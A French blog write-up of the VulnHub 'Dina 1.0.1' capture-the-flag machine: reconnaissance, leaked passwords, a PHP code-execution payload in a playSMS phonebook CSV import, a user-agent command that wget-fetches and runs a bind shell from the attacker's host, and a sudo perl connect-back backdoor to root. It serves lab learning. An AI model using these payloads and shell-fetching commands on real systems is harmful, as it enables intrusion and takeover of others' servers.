# Solution du CTF Dina: 1.0.1 de VulnHub

On continue les CTF de chez VulnHub avec le [Dina 1.0.1](https://www.vulnhub.com/entry/dina-101,200/) datant d'octobre 2017.  

#my secret webapp
-----------------

```plain
Nmap scan report for 192.168.1.48
Host is up (0.00036s latency).
Not shown: 65528 closed ports
PORT      STATE    SERVICE VERSION
80/tcp    open     http    Apache httpd 2.2.22 ((Ubuntu))
| http-robots.txt: 5 disallowed entries
|_/ange1 /angel1 /nothing /tmp /uploads
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Dina
23490/tcp filtered unknown
35921/tcp filtered unknown
55285/tcp filtered unknown
59929/tcp filtered unknown
59990/tcp filtered unknown
60771/tcp filtered unknown
```

Un seul port ouvert, un joli *It works* à la racine mais un *index.html* tout de même présent qui ne nous apporte rien de plus.  

On retrouve certains des dossiers présents dans le *robots.txt* avec un buster ainsi que des nouveaux :  

```plain
http://192.168.1.48/cgi-bin/ - HTTP 403 (240 bytes, gzip)
http://192.168.1.48/doc/ - HTTP 403 (236 bytes, gzip)
http://192.168.1.48/icons/ - HTTP 403 (238 bytes, gzip)
http://192.168.1.48/nothing/ - HTTP 200 (154 bytes, gzip)
http://192.168.1.48/secure/ - HTTP 200 (452 bytes, gzip) - Directory listing found
http://192.168.1.48/server-status/ - HTTP 403 (240 bytes, gzip)
http://192.168.1.48/tmp/ - HTTP 200 (395 bytes, gzip) - Directory listing found
http://192.168.1.48/uploads/ - HTTP 200 (397 bytes, gzip) - Directory listing found
```

Les dossiers *ange1*, *angel1*, *tmp* et *uploads* sont vides.  

Sous */nothing* la page HTML contient un commentaire avec des mots de passe :  

```html
<!--
#my secret pass
freedom
password
helloworld!
diana
iloveroot
-->
```

Ça devrait s'avérer utile...  

Justement il y a une archive *backup.zip* sous */secure/* qui semble nécessiter un mot de passe :  

```plain
$ unzip backup.zip
Archive:  backup.zip
   skipping: backup-cred.mp3         need PK compat. v5.1 (can do v4.6)

$ 7z x backup.zip

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=fr_FR.UTF-8,Utf16=on,HugeFiles=on,4 CPUs)

Processing archive: backup.zip

Extracting  backup-cred.mp3
Enter password (will not be echoed) :
```

Et en rentrant le mot de passe *freedom* on obtient un fichier *backup-cred.mp3* qui est en réalité un fichier texte :  

```plain
I am not toooo smart in computer .......dat the resoan i always choose easy password...with creds backup file....

uname: touhid
password: ******

url : /SecreTSMSgatwayLogin
```

./webpwn
--------

On se rend sur l'URL en question qui présente une mire de login. On parvient à si connecter avec *touhid* / *diana*.  

Il s'agit de [playSMS](https://playsms.org/) qui se défini comme un *Free and Open Source SMS Gateway*.  

Un tour rapide de l'application et je tique assez vite sur la fonction d'import de fichiers sur phonebook.  

Vu que c'est une vrai application je préfère regarder [la liste des vulnérabilités connues](https://www.cvedetails.com/vulnerability-list.php?vendor_id=2477&product_id=0&version_id=0&page=1&hasexp=0&opdos=0&opec=0&opov=0&opcsrf=0&opgpriv=0&opsqli=0&opxss=0&opdirt=0&opmemc=0&ophttprs=0&opbyp=0&opfileinc=0&opginf=0&cvssscoremin=0&cvssscoremax=0&year=0&month=0&cweid=0&order=1&trc=6&sha=8c0e7e35a77560b7cd811bce1ac0a63b8fcb526f) et, oh que le monde est petit, [un exploit écrit par l'auteur du challenge](https://www.exploit-db.com/exploits/42044/)... c'est un signe :)   

[Une vidéo de l'exploit](https://www.youtube.com/watch?v=KIB9sKQdEwE) est citée en référence et on voit qu'il faut uploader un CSV contenant du code PHP spécifique tout en ayant placé le code PHP à exécuter dans notre user-agent.  

Après avoir essayé l'un des switchers j'ai opté pour [celui-ci](https://chrome.google.com/webstore/detail/user-agent-switcher-for-g/ffhkkpnppgnfaobgihpdblnhmmbodake?utm_source=chrome-app-launcher-info-dialog) qui semble être le même que dans la vidéo.  

Le fichier CSV uploadé à cette forme (il doit respecter les colonnes du phonebook) :  

```plain
"Name","Mobile","Email","Group Code","Tags"
"<?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?>",22,,,
```

Ce qui permet alors l'exécution de commandes :  

![Dina VulnHub playSMS interface](https://raw.githubusercontent.com/devl00p/blog/master/images/dina_playsms.png)

Comme pour le précédent challenge j'ai eu recours à [tcp\_pty\_bind.py](https://github.com/infodox/python-pty-shells/blob/master/tcp_pty_bind.py) qui s'avère bien pratique.  

Mon user-agent était alors *cd /tmp; wget http://192.168.1.6:8000/tcp\_pty\_bind.py; setsid python tcp\_pty\_bind.py&*  

```plain
$ ncat 192.168.1.48 31337 -v
Ncat: Version 7.01 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.1.48:31337.
www-data@Dina:/tmp$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

g0tr00t?
--------

Sympa ce petit shell mais un peu limité. Le shell définit pour *www-data* est bien */bin/sh*... mais il n'y a pas de sshd sur la machine... sniff.  

Il y a un utilisateur *touhid* qui pourrait être intéressant. Quelques fichiers dans son dossier Downloads mais ils ont le même hash md5 que ceux sous la racine web :-/   

A tout hasard, peut-on exécuter certaines commandes en tant que root ?   

```plain
www-data@Dina:/tmp$ sudo -l
Matching Defaults entries for www-data on this host:
    env_reset,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on this host:
    (ALL) NOPASSWD: /usr/bin/perl
```

Bingo !  

Plus qu'à récupérer ce fameux [dc.pl](https://pastebin.com/raw/bq6Zbpya) (pas de quoi me rajeunir) et l'exécuter avec sudo.  

```plain
Ncat: Version 7.01 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 192.168.1.48.
Ncat: Connection from 192.168.1.48:49435.
--== ConnectBack Backdoor Shell EDITED BY XORON TURK?SH HACKER ==--

--==Systeminfo==--
Linux Dina 3.2.0-23-generic-pae #36-Ubuntu SMP Tue Apr 10 22:19:09 UTC 2012 i686 i686 i386 GNU/Linux

--==Userinfo==--
uid=0(root) gid=0(root) groups=0(root)

--==Directory==--
/tmp

--==Shell==--
cd /root
ls
flag.txt
cat flag.txt
________                                                _________
\________\--------___       ___         ____----------/_________/
    \_______\----\\\\\\   //_ _ \\    //////-------/________/
        \______\----\\|| (( ~|~ )))  ||//------/________/
            \_____\---\\ ((\ = / ))) //----/_____/
                 \____\--\_)))  \ _)))---/____/
                       \__/  (((     (((_/
                          |  -)))  -  ))

root password is : hello@3210
easy one .....but hard to guess.....
but i think u dont need root password......
u already have root shelll....

CONGO.........
FLAG : 22d06624cd604a0626eb5a2992a6f2e6
```

Simple et rapide :p

*Published February 10 2018 at 16:00*